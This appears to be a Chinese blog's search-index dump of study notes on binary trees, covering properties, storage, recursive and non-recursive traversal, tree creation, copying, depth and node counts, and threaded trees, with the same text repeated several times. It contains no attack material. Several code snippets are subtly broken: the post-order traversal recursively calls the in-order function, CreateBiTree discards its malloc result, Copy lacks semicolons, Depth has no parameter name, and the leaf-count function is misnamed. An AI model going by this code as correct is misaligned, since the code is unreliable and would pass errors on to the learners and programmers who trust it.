二叉树可以是空集合，根可以有空的左子树或者空的右子树 为什么要用二叉树： 结构最简单，规律性最强 可以证明，所有树都能转为唯一对应的二叉树，不失一般性。 普通树若不转化为二叉树，运算很难实现 注： 二叉树不是树的特殊情况，这是两个概念 二叉树结点的子树分为左子树和右子树，而树是不区分左右次序的 **性质1：**在二叉树的第i层上至多有2^(i-1)个结点（至少有1个结点） **性质2：**深度为k的二叉树至多有2^k-1个结点（至少有k个结点） **性质3：**对于任何一棵二叉树，若2度的结点数有n2个，则叶子数n0必定为n2+1（即n0=n2+1） 案例6.1：数据压缩问题将数据文件转换成由0、1组成的二进制串，称之为编码 案例6.2：利用二叉树求解表达式的值以二叉树表示表达式的递归定义如下： （1）若表达式为数或简单变量，则相应二叉树中仅有一个根结点，其数据域存放该表达式信息； （2）若表达式“第一操作数 运算符 第二操作数”的形式，则相应的二叉树中以左子树表示第一操作数，右子树表示第二操作数，根结点的数据域存放运算符（若为一元运算符，则左子树为空），其中，操作数本身有为表达式。 二叉树的抽象数据类型定义\r二叉树的性质\r满二叉树\r满二叉树一定是完全二叉树，完全二叉树不一定是满二叉树 完全二叉树\r注：在满二叉树中，从最后一个结点开始，连续去掉任意个结点，即是一棵完全二叉树 特点： 叶子只可能分布在层次最大的两层上 对任一结点，如果其右子树的最大层次为i，其左子树的最大层必为i或i+1 完全二叉树性质\r二叉树的存储结构\r顺序存储实现：按满二叉树的结点层次编号，一次存放二叉树中的数据元素 //二叉树顺序存储表示 #define MAXSIZE 100 Typedef TElemType SqBiTree[MAXSIZE] SqBiTree bt; 特点：结点间关系蕴含再其存储位置中，浪费空间，适于存满二叉树和完全二叉树 链式存储\r二叉链表 typedef struct BiNode{ TElem Type data; struct BiNode *Lchild,*rchild; }BiNode,*BiTree; 三叉链表 遍历二叉树**遍历定义：**顺着某一条搜索路径巡访二叉树中的结点，使得每个结点均被访问一次，而且仅被访问一次。 **遍历目的：**得到树中的所有结点的一个线性排列。 **遍历用途：**它是树结构插入、删除、修改、查找和排序运算的前提，是二叉树一切运算的基础和核心。 **遍历方法：**依次遍历二叉树中的三个部分，便是遍历了整个二叉树。 若规定先左后右，则只有三种情况： 递归遍历算法先序遍历 Stauts PreOrderTraverse(BiTree T){ if(T==NULL) return OK; //空二叉树 else{ visit(T); //访问根结点 PreOrderTraverse(T-\u003elchild); //递归遍历左子树 PreOrderTraverse(T-\u003erchild); //递归遍历右子树 } } 中序遍历 Status InOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); visit(T); InOrderTraverse(T-\u003erchild); } } 后序遍历 Status PostOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); InOrderTraverse(T-\u003erchild); visit(T); } } 遍历算法分析 时间复杂度：O(n) //每个结点之访问一次 空间效率： O(n) //栈占用的最大辅助空间 非递归遍历以中序遍历为例 使用栈来实现 Status InOrderTraverse(BiTree T){ BiTree p; InitStack(S); p=T; while(p || !StackEmpty(S)){ if(p) {Push(S,p); p=p-\u003elchild;} else {Pop(S,q); printf(\"%c\",q-\u003edata); p=q-\u003erchild;} }//while return OK; } 层次遍历对于一颗二叉树，从根结点开始，按从上到下、从左到右的顺序访问每一个结点。每个结点仅仅访问一次。 使用队列来实现 循环队列类型定义： typedef struct{ BTNode data[MaxSize]; //存放队中元素 int front, rear; //队头和队尾指针 }SqQueue //顺序循环队列类型 层次遍历算法： void LevelOrder(BTNode *b){ BTNode *p; SqQueue *qu; InitQueue(qu); enQueue(qu,b); while(!QueueEmpty(qu)){ deQueue(qu,p); printf(\"%c\",p-\u003edata); if(p-\u003elchild!=NULL) enQueue(qu,p-\u003elchild); if(p-\u003erchild!=NULL) enQueue(qu,p-\u003erchild)； } } 遍历算法的应用\r创建二叉树按先序遍历序列建立二叉树的二叉链表 对下图所示二叉树，按下列顺序读入字符： ABC##DE#G##F### Status CreateBiTree(BiTree \u0026T){ scanf(\u0026ch); if(ch==\"#\") T = NULL; else{ if(!(BiTNode *)malloc(sizeof(BiTNode))) exit(OVERFLOW); T-\u003edata = ch; CreateBiTree(T-\u003elchild); CreateBiTree(T-\u003erchild); } return OK; } 复制二叉树 int Copy(BiTree T, BiTree \u0026NewT){ if(T==NULL){ NewT=NULL; return 0; } else{ NewT=new BiTNode; NewT-\u003edata=T-\u003edata; Copy(T-\u003elChild, NewT-\u003elchild) Copy(T-\u003erChild, NewT-\u003erchild) } } 计算二叉树深度 int Depth(BiTree){ if(T==NULL) return 0; else{ m=Depth(T-\u003elChild); n=Depth(T-\u003erChild); if(m\u003en) return(m+1); else return(n+1);//比较左右子树最大深度并+1 } } 计算二叉树结点总数 int NodeCount(BiTree T){ if(T==NULL) return 0; else return NodeCount(T-\u003elchild)+NodeCount(T-\u003erchild)+1; } 计算二叉树叶子结点总数 int LeadCount(BiTree T){ if(T==NULL) return 0; if(T-\u003elchild==NULL\u0026\u0026T-\u003erchild==NULL) return 1; else return LeafCount(T-\u003elchild)+LeafCount(T-\u003erchild); } 线索二叉树利用二叉链表中的空指针域： 如果某个个结点的左孩子为空，则将空的左孩子指针域改为指向其前驱；如果某结点的右孩子为空，则将空的右孩子指针域改为指向其后继，这种改变指向的指针称为“线索”，加上了线索的二叉树称为线索二叉树（Threaded Binary Tree）。 为区分lchild和rchild指针是指向孩子的指针还是指向前驱或者后继的指针，对二叉链表中每个结点增设两个标志域ltag和rtag，并约定： ltag=0 lchild指向该结点的左孩子 ltag=1 lchild指向该结点的前驱 rtag=0 rchild指向该结点的右孩子 rtag=1 rchild指向该结点的后继 结点的结构： typedef struct BiThrNode{ int data; int ltag,rtag; struct BiThrNode *lchild,rchild; } 为避免第一个结点和最后一个结点悬空 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#链式存储"},{"categories":["notice"],"content":"\r二叉树是n（n\u003e=0）个结点所构成的集合，它或为空树，或为非空树，对于非空树T： 有且仅有一个称之为根的结点 除根结点以外的其余结点分为两个互不相交的子集T1和T2，分别成为T的左子树和右子树，且T1和T2本身又都是二叉树 基本特点： 结点的度\u003c=2 有序树（子树有序，不能颠倒） 二叉树可以是空集合，根可以有空的左子树或者空的右子树 为什么要用二叉树： 结构最简单，规律性最强 可以证明，所有树都能转为唯一对应的二叉树，不失一般性。 普通树若不转化为二叉树，运算很难实现 注： 二叉树不是树的特殊情况，这是两个概念 二叉树结点的子树分为左子树和右子树，而树是不区分左右次序的 **性质1：**在二叉树的第i层上至多有2^(i-1)个结点（至少有1个结点） **性质2：**深度为k的二叉树至多有2^k-1个结点（至少有k个结点） **性质3：**对于任何一棵二叉树，若2度的结点数有n2个，则叶子数n0必定为n2+1（即n0=n2+1） 案例6.1：数据压缩问题将数据文件转换成由0、1组成的二进制串，称之为编码 案例6.2：利用二叉树求解表达式的值以二叉树表示表达式的递归定义如下： （1）若表达式为数或简单变量，则相应二叉树中仅有一个根结点，其数据域存放该表达式信息； （2）若表达式“第一操作数 运算符 第二操作数”的形式，则相应的二叉树中以左子树表示第一操作数，右子树表示第二操作数，根结点的数据域存放运算符（若为一元运算符，则左子树为空），其中，操作数本身有为表达式。 二叉树的抽象数据类型定义\r二叉树的性质\r满二叉树\r满二叉树一定是完全二叉树，完全二叉树不一定是满二叉树 完全二叉树\r注：在满二叉树中，从最后一个结点开始，连续去掉任意个结点，即是一棵完全二叉树 特点： 叶子只可能分布在层次最大的两层上 对任一结点，如果其右子树的最大层次为i，其左子树的最大层必为i或i+1 完全二叉树性质\r二叉树的存储结构\r顺序存储实现：按满二叉树的结点层次编号，一次存放二叉树中的数据元素 //二叉树顺序存储表示 #define MAXSIZE 100 Typedef TElemType SqBiTree[MAXSIZE] SqBiTree bt; 特点：结点间关系蕴含再其存储位置中，浪费空间，适于存满二叉树和完全二叉树 链式存储\r二叉链表 typedef struct BiNode{ TElem Type data; struct BiNode *Lchild,*rchild; }BiNode,*BiTree; 三叉链表 遍历二叉树**遍历定义：**顺着某一条搜索路径巡访二叉树中的结点，使得每个结点均被访问一次，而且仅被访问一次。 **遍历目的：**得到树中的所有结点的一个线性排列。 **遍历用途：**它是树结构插入、删除、修改、查找和排序运算的前提，是二叉树一切运算的基础和核心。 **遍历方法：**依次遍历二叉树中的三个部分，便是遍历了整个二叉树。 若规定先左后右，则只有三种情况： 递归遍历算法先序遍历 Stauts PreOrderTraverse(BiTree T){ if(T==NULL) return OK; //空二叉树 else{ visit(T); //访问根结点 PreOrderTraverse(T-\u003elchild); //递归遍历左子树 PreOrderTraverse(T-\u003erchild); //递归遍历右子树 } } 中序遍历 Status InOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); visit(T); InOrderTraverse(T-\u003erchild); } } 后序遍历 Status PostOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); InOrderTraverse(T-\u003erchild); visit(T); } } 遍历算法分析 时间复杂度：O(n) //每个结点之访问一次 空间效率： O(n) //栈占用的最大辅助空间 非递归遍历以中序遍历为例 使用栈来实现 Status InOrderTraverse(BiTree T){ BiTree p; InitStack(S); p=T; while(p || !StackEmpty(S)){ if(p) {Push(S,p); p=p-\u003elchild;} else {Pop(S,q); printf(\"%c\",q-\u003edata); p=q-\u003erchild;} }//while return OK; } 层次遍历对于一颗二叉树，从根结点开始，按从上到下、从左到右的顺序访问每一个结点。每个结点仅仅访问一次。 使用队列来实现 循环队列类型定义： typedef struct{ BTNode data[MaxSize]; //存放队中元素 int front, rear; //队头和队尾指针 }SqQueue //顺序循环队列类型 层次遍历算法： void LevelOrder(BTNode *b){ BTNode *p; SqQueue *qu; InitQueue(qu); enQueue(qu,b); while(!QueueEmpty(qu)){ deQueue(qu,p); printf(\"%c\",p-\u003edata); if(p-\u003elchild!=NULL) enQueue(qu,p-\u003elchild); if(p-\u003erchild!=NULL) enQueue(qu,p-\u003erchild)； } } 遍历算法的应用\r创建二叉树按先序遍历序列建立二叉树的二叉链表 对下图所示二叉树，按下列顺序读入字符： ABC##DE#G##F### Status CreateBiTree(BiTree \u0026T){ scanf(\u0026ch); if(ch==\"#\") T = NULL; else{ if(!(BiTNode *)malloc(sizeof(BiTNode))) exit(OVERFLOW); T-\u003edata = ch; CreateBiTree(T-\u003elchild); CreateBiTree(T-\u003erchild); } return OK; } 复制二叉树 int Copy(BiTree T, BiTree \u0026NewT){ if(T==NULL){ NewT=NULL; return 0; } else{ NewT=new BiTNode; NewT-\u003edata=T-\u003edata; Copy(T-\u003elChild, NewT-\u003elchild) Copy(T-\u003erChild, NewT-\u003erchild) } } 计算二叉树深度 int Depth(BiTree){ if(T==NULL) return 0; else{ m=Depth(T-\u003elChild); n=Depth(T-\u003erChild); if(m\u003en) return(m+1); else return(n+1);//比较左右子树最大深度并+1 } } 计算二叉树结点总数 int NodeCount(BiTree T){ if(T==NULL) return 0; else return NodeCount(T-\u003elchild)+NodeCount(T-\u003erchild)+1; } 计算二叉树叶子结点总数 int LeadCount(BiTree T){ if(T==NULL) return 0; if(T-\u003elchild==NULL\u0026\u0026T-\u003erchild==NULL) return 1; else return LeafCount(T-\u003elchild)+LeafCount(T-\u003erchild); } 线索二叉树利用二叉链表中的空指针域： 如果某个个结点的左孩子为空，则将空的左孩子指针域改为指向其前驱；如果某结点的右孩子为空，则将空的右孩子指针域改为指向其后继，这种改变指向的指针称为“线索”，加上了线索的二叉树称为线索二叉树（Threaded Binary Tree）。 为区分lchild和rchild指针是指向孩子的指针还是指向前驱或者后继的指针，对二叉链表中每个结点增设两个标志域ltag和rtag，并约定： ltag=0 lchild指向该结点的左孩子 ltag=1 lchild指向该结点的前驱 rtag=0 rchild指向该结点的右孩子 rtag=1 rchild指向该结点的后继 结点的结构： typedef struct BiThrNode{ int data; int ltag,rtag; struct BiThrNode *lchild,rchild; } 为避免第一个结点和最后一个结点悬空 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#遍历二叉树"},{"categories":["notice"],"content":"\r二叉树是n（n\u003e=0）个结点所构成的集合，它或为空树，或为非空树，对于非空树T： 有且仅有一个称之为根的结点 除根结点以外的其余结点分为两个互不相交的子集T1和T2，分别成为T的左子树和右子树，且T1和T2本身又都是二叉树 基本特点： 结点的度\u003c=2 有序树（子树有序，不能颠倒） 二叉树可以是空集合，根可以有空的左子树或者空的右子树 为什么要用二叉树： 结构最简单，规律性最强 可以证明，所有树都能转为唯一对应的二叉树，不失一般性。 普通树若不转化为二叉树，运算很难实现 注： 二叉树不是树的特殊情况，这是两个概念 二叉树结点的子树分为左子树和右子树，而树是不区分左右次序的 **性质1：**在二叉树的第i层上至多有2^(i-1)个结点（至少有1个结点） **性质2：**深度为k的二叉树至多有2^k-1个结点（至少有k个结点） **性质3：**对于任何一棵二叉树，若2度的结点数有n2个，则叶子数n0必定为n2+1（即n0=n2+1） 案例6.1：数据压缩问题将数据文件转换成由0、1组成的二进制串，称之为编码 案例6.2：利用二叉树求解表达式的值以二叉树表示表达式的递归定义如下： （1）若表达式为数或简单变量，则相应二叉树中仅有一个根结点，其数据域存放该表达式信息； （2）若表达式“第一操作数 运算符 第二操作数”的形式，则相应的二叉树中以左子树表示第一操作数，右子树表示第二操作数，根结点的数据域存放运算符（若为一元运算符，则左子树为空），其中，操作数本身有为表达式。 二叉树的抽象数据类型定义\r二叉树的性质\r满二叉树\r满二叉树一定是完全二叉树，完全二叉树不一定是满二叉树 完全二叉树\r注：在满二叉树中，从最后一个结点开始，连续去掉任意个结点，即是一棵完全二叉树 特点： 叶子只可能分布在层次最大的两层上 对任一结点，如果其右子树的最大层次为i，其左子树的最大层必为i或i+1 完全二叉树性质\r二叉树的存储结构\r顺序存储实现：按满二叉树的结点层次编号，一次存放二叉树中的数据元素 //二叉树顺序存储表示 #define MAXSIZE 100 Typedef TElemType SqBiTree[MAXSIZE] SqBiTree bt; 特点：结点间关系蕴含再其存储位置中，浪费空间，适于存满二叉树和完全二叉树 链式存储\r二叉链表 typedef struct BiNode{ TElem Type data; struct BiNode *Lchild,*rchild; }BiNode,*BiTree; 三叉链表 遍历二叉树**遍历定义：**顺着某一条搜索路径巡访二叉树中的结点，使得每个结点均被访问一次，而且仅被访问一次。 **遍历目的：**得到树中的所有结点的一个线性排列。 **遍历用途：**它是树结构插入、删除、修改、查找和排序运算的前提，是二叉树一切运算的基础和核心。 **遍历方法：**依次遍历二叉树中的三个部分，便是遍历了整个二叉树。 若规定先左后右，则只有三种情况： 递归遍历算法先序遍历 Stauts PreOrderTraverse(BiTree T){ if(T==NULL) return OK; //空二叉树 else{ visit(T); //访问根结点 PreOrderTraverse(T-\u003elchild); //递归遍历左子树 PreOrderTraverse(T-\u003erchild); //递归遍历右子树 } } 中序遍历 Status InOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); visit(T); InOrderTraverse(T-\u003erchild); } } 后序遍历 Status PostOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); InOrderTraverse(T-\u003erchild); visit(T); } } 遍历算法分析 时间复杂度：O(n) //每个结点之访问一次 空间效率： O(n) //栈占用的最大辅助空间 非递归遍历以中序遍历为例 使用栈来实现 Status InOrderTraverse(BiTree T){ BiTree p; InitStack(S); p=T; while(p || !StackEmpty(S)){ if(p) {Push(S,p); p=p-\u003elchild;} else {Pop(S,q); printf(\"%c\",q-\u003edata); p=q-\u003erchild;} }//while return OK; } 层次遍历对于一颗二叉树，从根结点开始，按从上到下、从左到右的顺序访问每一个结点。每个结点仅仅访问一次。 使用队列来实现 循环队列类型定义： typedef struct{ BTNode data[MaxSize]; //存放队中元素 int front, rear; //队头和队尾指针 }SqQueue //顺序循环队列类型 层次遍历算法： void LevelOrder(BTNode *b){ BTNode *p; SqQueue *qu; InitQueue(qu); enQueue(qu,b); while(!QueueEmpty(qu)){ deQueue(qu,p); printf(\"%c\",p-\u003edata); if(p-\u003elchild!=NULL) enQueue(qu,p-\u003elchild); if(p-\u003erchild!=NULL) enQueue(qu,p-\u003erchild)； } } 遍历算法的应用\r创建二叉树按先序遍历序列建立二叉树的二叉链表 对下图所示二叉树，按下列顺序读入字符： ABC##DE#G##F### Status CreateBiTree(BiTree \u0026T){ scanf(\u0026ch); if(ch==\"#\") T = NULL; else{ if(!(BiTNode *)malloc(sizeof(BiTNode))) exit(OVERFLOW); T-\u003edata = ch; CreateBiTree(T-\u003elchild); CreateBiTree(T-\u003erchild); } return OK; } 复制二叉树 int Copy(BiTree T, BiTree \u0026NewT){ if(T==NULL){ NewT=NULL; return 0; } else{ NewT=new BiTNode; NewT-\u003edata=T-\u003edata; Copy(T-\u003elChild, NewT-\u003elchild) Copy(T-\u003erChild, NewT-\u003erchild) } } 计算二叉树深度 int Depth(BiTree){ if(T==NULL) return 0; else{ m=Depth(T-\u003elChild); n=Depth(T-\u003erChild); if(m\u003en) return(m+1); else return(n+1);//比较左右子树最大深度并+1 } } 计算二叉树结点总数 int NodeCount(BiTree T){ if(T==NULL) return 0; else return NodeCount(T-\u003elchild)+NodeCount(T-\u003erchild)+1; } 计算二叉树叶子结点总数 int LeadCount(BiTree T){ if(T==NULL) return 0; if(T-\u003elchild==NULL\u0026\u0026T-\u003erchild==NULL) return 1; else return LeafCount(T-\u003elchild)+LeafCount(T-\u003erchild); } 线索二叉树利用二叉链表中的空指针域： 如果某个个结点的左孩子为空，则将空的左孩子指针域改为指向其前驱；如果某结点的右孩子为空，则将空的右孩子指针域改为指向其后继，这种改变指向的指针称为“线索”，加上了线索的二叉树称为线索二叉树（Threaded Binary Tree）。 为区分lchild和rchild指针是指向孩子的指针还是指向前驱或者后继的指针，对二叉链表中每个结点增设两个标志域ltag和rtag，并约定： ltag=0 lchild指向该结点的左孩子 ltag=1 lchild指向该结点的前驱 rtag=0 rchild指向该结点的右孩子 rtag=1 rchild指向该结点的后继 结点的结构： typedef struct BiThrNode{ int data; int ltag,rtag; struct BiThrNode *lchild,rchild; } 为避免第一个结点和最后一个结点悬空 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#递归遍历算法"},{"categories":["notice"],"content":"\r二叉树是n（n\u003e=0）个结点所构成的集合，它或为空树，或为非空树，对于非空树T： 有且仅有一个称之为根的结点 除根结点以外的其余结点分为两个互不相交的子集T1和T2，分别成为T的左子树和右子树，且T1和T2本身又都是二叉树 基本特点： 结点的度\u003c=2 有序树（子树有序，不能颠倒） 二叉树可以是空集合，根可以有空的左子树或者空的右子树 为什么要用二叉树： 结构最简单，规律性最强 可以证明，所有树都能转为唯一对应的二叉树，不失一般性。 普通树若不转化为二叉树，运算很难实现 注： 二叉树不是树的特殊情况，这是两个概念 二叉树结点的子树分为左子树和右子树，而树是不区分左右次序的 **性质1：**在二叉树的第i层上至多有2^(i-1)个结点（至少有1个结点） **性质2：**深度为k的二叉树至多有2^k-1个结点（至少有k个结点） **性质3：**对于任何一棵二叉树，若2度的结点数有n2个，则叶子数n0必定为n2+1（即n0=n2+1） 案例6.1：数据压缩问题将数据文件转换成由0、1组成的二进制串，称之为编码 案例6.2：利用二叉树求解表达式的值以二叉树表示表达式的递归定义如下： （1）若表达式为数或简单变量，则相应二叉树中仅有一个根结点，其数据域存放该表达式信息； （2）若表达式“第一操作数 运算符 第二操作数”的形式，则相应的二叉树中以左子树表示第一操作数，右子树表示第二操作数，根结点的数据域存放运算符（若为一元运算符，则左子树为空），其中，操作数本身有为表达式。 二叉树的抽象数据类型定义\r二叉树的性质\r满二叉树\r满二叉树一定是完全二叉树，完全二叉树不一定是满二叉树 完全二叉树\r注：在满二叉树中，从最后一个结点开始，连续去掉任意个结点，即是一棵完全二叉树 特点： 叶子只可能分布在层次最大的两层上 对任一结点，如果其右子树的最大层次为i，其左子树的最大层必为i或i+1 完全二叉树性质\r二叉树的存储结构\r顺序存储实现：按满二叉树的结点层次编号，一次存放二叉树中的数据元素 //二叉树顺序存储表示 #define MAXSIZE 100 Typedef TElemType SqBiTree[MAXSIZE] SqBiTree bt; 特点：结点间关系蕴含再其存储位置中，浪费空间，适于存满二叉树和完全二叉树 链式存储\r二叉链表 typedef struct BiNode{ TElem Type data; struct BiNode *Lchild,*rchild; }BiNode,*BiTree; 三叉链表 遍历二叉树**遍历定义：**顺着某一条搜索路径巡访二叉树中的结点，使得每个结点均被访问一次，而且仅被访问一次。 **遍历目的：**得到树中的所有结点的一个线性排列。 **遍历用途：**它是树结构插入、删除、修改、查找和排序运算的前提，是二叉树一切运算的基础和核心。 **遍历方法：**依次遍历二叉树中的三个部分，便是遍历了整个二叉树。 若规定先左后右，则只有三种情况： 递归遍历算法先序遍历 Stauts PreOrderTraverse(BiTree T){ if(T==NULL) return OK; //空二叉树 else{ visit(T); //访问根结点 PreOrderTraverse(T-\u003elchild); //递归遍历左子树 PreOrderTraverse(T-\u003erchild); //递归遍历右子树 } } 中序遍历 Status InOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); visit(T); InOrderTraverse(T-\u003erchild); } } 后序遍历 Status PostOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); InOrderTraverse(T-\u003erchild); visit(T); } } 遍历算法分析 时间复杂度：O(n) //每个结点之访问一次 空间效率： O(n) //栈占用的最大辅助空间 非递归遍历以中序遍历为例 使用栈来实现 Status InOrderTraverse(BiTree T){ BiTree p; InitStack(S); p=T; while(p || !StackEmpty(S)){ if(p) {Push(S,p); p=p-\u003elchild;} else {Pop(S,q); printf(\"%c\",q-\u003edata); p=q-\u003erchild;} }//while return OK; } 层次遍历对于一颗二叉树，从根结点开始，按从上到下、从左到右的顺序访问每一个结点。每个结点仅仅访问一次。 使用队列来实现 循环队列类型定义： typedef struct{ BTNode data[MaxSize]; //存放队中元素 int front, rear; //队头和队尾指针 }SqQueue //顺序循环队列类型 层次遍历算法： void LevelOrder(BTNode *b){ BTNode *p; SqQueue *qu; InitQueue(qu); enQueue(qu,b); while(!QueueEmpty(qu)){ deQueue(qu,p); printf(\"%c\",p-\u003edata); if(p-\u003elchild!=NULL) enQueue(qu,p-\u003elchild); if(p-\u003erchild!=NULL) enQueue(qu,p-\u003erchild)； } } 遍历算法的应用\r创建二叉树按先序遍历序列建立二叉树的二叉链表 对下图所示二叉树，按下列顺序读入字符： ABC##DE#G##F### Status CreateBiTree(BiTree \u0026T){ scanf(\u0026ch); if(ch==\"#\") T = NULL; else{ if(!(BiTNode *)malloc(sizeof(BiTNode))) exit(OVERFLOW); T-\u003edata = ch; CreateBiTree(T-\u003elchild); CreateBiTree(T-\u003erchild); } return OK; } 复制二叉树 int Copy(BiTree T, BiTree \u0026NewT){ if(T==NULL){ NewT=NULL; return 0; } else{ NewT=new BiTNode; NewT-\u003edata=T-\u003edata; Copy(T-\u003elChild, NewT-\u003elchild) Copy(T-\u003erChild, NewT-\u003erchild) } } 计算二叉树深度 int Depth(BiTree){ if(T==NULL) return 0; else{ m=Depth(T-\u003elChild); n=Depth(T-\u003erChild); if(m\u003en) return(m+1); else return(n+1);//比较左右子树最大深度并+1 } } 计算二叉树结点总数 int NodeCount(BiTree T){ if(T==NULL) return 0; else return NodeCount(T-\u003elchild)+NodeCount(T-\u003erchild)+1; } 计算二叉树叶子结点总数 int LeadCount(BiTree T){ if(T==NULL) return 0; if(T-\u003elchild==NULL\u0026\u0026T-\u003erchild==NULL) return 1; else return LeafCount(T-\u003elchild)+LeafCount(T-\u003erchild); } 线索二叉树利用二叉链表中的空指针域： 如果某个个结点的左孩子为空，则将空的左孩子指针域改为指向其前驱；如果某结点的右孩子为空，则将空的右孩子指针域改为指向其后继，这种改变指向的指针称为“线索”，加上了线索的二叉树称为线索二叉树（Threaded Binary Tree）。 为区分lchild和rchild指针是指向孩子的指针还是指向前驱或者后继的指针，对二叉链表中每个结点增设两个标志域ltag和rtag，并约定： ltag=0 lchild指向该结点的左孩子 ltag=1 lchild指向该结点的前驱 rtag=0 rchild指向该结点的右孩子 rtag=1 rchild指向该结点的后继 结点的结构： typedef struct BiThrNode{ int data; int ltag,rtag; struct BiThrNode *lchild,rchild; } 为避免第一个结点和最后一个结点悬空 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#非递归遍历"},{"categories":["notice"],"content":"\r二叉树是n（n\u003e=0）个结点所构成的集合，它或为空树，或为非空树，对于非空树T： 有且仅有一个称之为根的结点 除根结点以外的其余结点分为两个互不相交的子集T1和T2，分别成为T的左子树和右子树，且T1和T2本身又都是二叉树 基本特点： 结点的度\u003c=2 有序树（子树有序，不能颠倒） 二叉树可以是空集合，根可以有空的左子树或者空的右子树 为什么要用二叉树： 结构最简单，规律性最强 可以证明，所有树都能转为唯一对应的二叉树，不失一般性。 普通树若不转化为二叉树，运算很难实现 注： 二叉树不是树的特殊情况，这是两个概念 二叉树结点的子树分为左子树和右子树，而树是不区分左右次序的 **性质1：**在二叉树的第i层上至多有2^(i-1)个结点（至少有1个结点） **性质2：**深度为k的二叉树至多有2^k-1个结点（至少有k个结点） **性质3：**对于任何一棵二叉树，若2度的结点数有n2个，则叶子数n0必定为n2+1（即n0=n2+1） 案例6.1：数据压缩问题将数据文件转换成由0、1组成的二进制串，称之为编码 案例6.2：利用二叉树求解表达式的值以二叉树表示表达式的递归定义如下： （1）若表达式为数或简单变量，则相应二叉树中仅有一个根结点，其数据域存放该表达式信息； （2）若表达式“第一操作数 运算符 第二操作数”的形式，则相应的二叉树中以左子树表示第一操作数，右子树表示第二操作数，根结点的数据域存放运算符（若为一元运算符，则左子树为空），其中，操作数本身有为表达式。 二叉树的抽象数据类型定义\r二叉树的性质\r满二叉树\r满二叉树一定是完全二叉树，完全二叉树不一定是满二叉树 完全二叉树\r注：在满二叉树中，从最后一个结点开始，连续去掉任意个结点，即是一棵完全二叉树 特点： 叶子只可能分布在层次最大的两层上 对任一结点，如果其右子树的最大层次为i，其左子树的最大层必为i或i+1 完全二叉树性质\r二叉树的存储结构\r顺序存储实现：按满二叉树的结点层次编号，一次存放二叉树中的数据元素 //二叉树顺序存储表示 #define MAXSIZE 100 Typedef TElemType SqBiTree[MAXSIZE] SqBiTree bt; 特点：结点间关系蕴含再其存储位置中，浪费空间，适于存满二叉树和完全二叉树 链式存储\r二叉链表 typedef struct BiNode{ TElem Type data; struct BiNode *Lchild,*rchild; }BiNode,*BiTree; 三叉链表 遍历二叉树**遍历定义：**顺着某一条搜索路径巡访二叉树中的结点，使得每个结点均被访问一次，而且仅被访问一次。 **遍历目的：**得到树中的所有结点的一个线性排列。 **遍历用途：**它是树结构插入、删除、修改、查找和排序运算的前提，是二叉树一切运算的基础和核心。 **遍历方法：**依次遍历二叉树中的三个部分，便是遍历了整个二叉树。 若规定先左后右，则只有三种情况： 递归遍历算法先序遍历 Stauts PreOrderTraverse(BiTree T){ if(T==NULL) return OK; //空二叉树 else{ visit(T); //访问根结点 PreOrderTraverse(T-\u003elchild); //递归遍历左子树 PreOrderTraverse(T-\u003erchild); //递归遍历右子树 } } 中序遍历 Status InOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); visit(T); InOrderTraverse(T-\u003erchild); } } 后序遍历 Status PostOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); InOrderTraverse(T-\u003erchild); visit(T); } } 遍历算法分析 时间复杂度：O(n) //每个结点之访问一次 空间效率： O(n) //栈占用的最大辅助空间 非递归遍历以中序遍历为例 使用栈来实现 Status InOrderTraverse(BiTree T){ BiTree p; InitStack(S); p=T; while(p || !StackEmpty(S)){ if(p) {Push(S,p); p=p-\u003elchild;} else {Pop(S,q); printf(\"%c\",q-\u003edata); p=q-\u003erchild;} }//while return OK; } 层次遍历对于一颗二叉树，从根结点开始，按从上到下、从左到右的顺序访问每一个结点。每个结点仅仅访问一次。 使用队列来实现 循环队列类型定义： typedef struct{ BTNode data[MaxSize]; //存放队中元素 int front, rear; //队头和队尾指针 }SqQueue //顺序循环队列类型 层次遍历算法： void LevelOrder(BTNode *b){ BTNode *p; SqQueue *qu; InitQueue(qu); enQueue(qu,b); while(!QueueEmpty(qu)){ deQueue(qu,p); printf(\"%c\",p-\u003edata); if(p-\u003elchild!=NULL) enQueue(qu,p-\u003elchild); if(p-\u003erchild!=NULL) enQueue(qu,p-\u003erchild)； } } 遍历算法的应用\r创建二叉树按先序遍历序列建立二叉树的二叉链表 对下图所示二叉树，按下列顺序读入字符： ABC##DE#G##F### Status CreateBiTree(BiTree \u0026T){ scanf(\u0026ch); if(ch==\"#\") T = NULL; else{ if(!(BiTNode *)malloc(sizeof(BiTNode))) exit(OVERFLOW); T-\u003edata = ch; CreateBiTree(T-\u003elchild); CreateBiTree(T-\u003erchild); } return OK; } 复制二叉树 int Copy(BiTree T, BiTree \u0026NewT){ if(T==NULL){ NewT=NULL; return 0; } else{ NewT=new BiTNode; NewT-\u003edata=T-\u003edata; Copy(T-\u003elChild, NewT-\u003elchild) Copy(T-\u003erChild, NewT-\u003erchild) } } 计算二叉树深度 int Depth(BiTree){ if(T==NULL) return 0; else{ m=Depth(T-\u003elChild); n=Depth(T-\u003erChild); if(m\u003en) return(m+1); else return(n+1);//比较左右子树最大深度并+1 } } 计算二叉树结点总数 int NodeCount(BiTree T){ if(T==NULL) return 0; else return NodeCount(T-\u003elchild)+NodeCount(T-\u003erchild)+1; } 计算二叉树叶子结点总数 int LeadCount(BiTree T){ if(T==NULL) return 0; 